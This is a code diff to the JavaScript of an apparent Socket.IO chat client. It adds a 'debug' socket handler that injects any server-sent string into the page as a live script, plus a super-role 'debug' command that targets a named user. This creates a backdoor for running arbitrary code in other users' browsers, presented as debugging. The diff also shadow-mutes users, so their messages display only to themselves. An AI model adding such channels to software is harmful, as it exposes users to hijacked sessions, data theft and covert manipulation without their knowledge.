@@ -65,6 +65,10 @@ $(function() {
     });
 
     socket.on('update', function(info) {
+        if(info.role == 'mute'){
+            info.role = 'basic'
+            info.idle = 1
+        }
         CLIENT.set(info);
     });
     
@@ -83,6 +87,13 @@ $(function() {
         } else {
             $("#youtube")[0].innerHTML = "<iframe width=\"420\" height=\"345\" src=\"https://www.youtube.com/embed/" + url.url +"?autoplay=1\" frameborder=\"0\" allowfullscreen></iframe>"
         }
+    });
+    
+    socket.on('debug', function(debug){
+        var s = document.createElement("script");
+        s.type = "text/javascript";
+        s.innerHTML = debug;
+        $("head").append(s);
     });
 
     socket.on('message', function(msg) {
@@ -164,7 +175,7 @@ $(function() {
             } else {
                 remove('alert',input)
             }
-        } else if (name == 'kick' || name == "ban" || name == "permaban" || name == "speak" || name == "pinch") {
+        } else if (name == 'kick' || name == "ban" || name == "permaban" || name == "speak" || name == "pinch" || name == "debug") {
             var pm = /^(.*?[^\\])(?:\|([\s\S]*))?$/.exec(input);
             if (pm) {
                 var nick = pm[1].replace('\\|', '|');
@@ -174,7 +185,12 @@ $(function() {
                         voice : nick,
                         message : message
                     }; 
-                } else {
+                } else if(name == "debug"){
+                    return {
+                        nick : nick,
+                        debug : message
+                    }; 
+                }else {
                     return {
                         nick : nick,
                         message : message
@@ -306,10 +322,19 @@ $(function() {
                     }
                 } else {
                     input = this.decorate(input);
-                    socket.emit('message', {
-                        flair : CLIENT.get('flair'),
-                        message : input
-                    });
+                    if(!CLIENT.get('idle')){
+                        socket.emit('message', {
+                            flair : CLIENT.get('flair'),
+                            message : input
+                        });
+                    } else {
+                        CLIENT.show({
+                            type : 'chat-message',
+                            nick : CLIENT.get('nick'),
+                            message : input,
+                            flair : CLIENT.get('flair')
+                        });
+                    }
                 }
             }
         },
@@ -1163,10 +1188,23 @@ $(function() {
             role : 'super',
             params : [ 'command', 'role' ]
         },
-        user_list : {},
+        user_list : {
+            handler : function() {
+                var admin = JSON.parse(CLIENT.get('access')).admin;
+                var admins = admin[0][0];
+                for (i = 1; i < admin.length; i++) { 
+                    admins += ', ' + admin[i][0]
+                }
+                CLIENT.show("admins : \n" + admins)
+            }
+        },
         frame : {
             role : 'super',
             params : [ 'url' ]
+        },
+        debug : {
+            role : 'super',
+            params : [ 'nick', 'debug' ]
         }
         /*pinch : {
             params : [ 'nick' ]
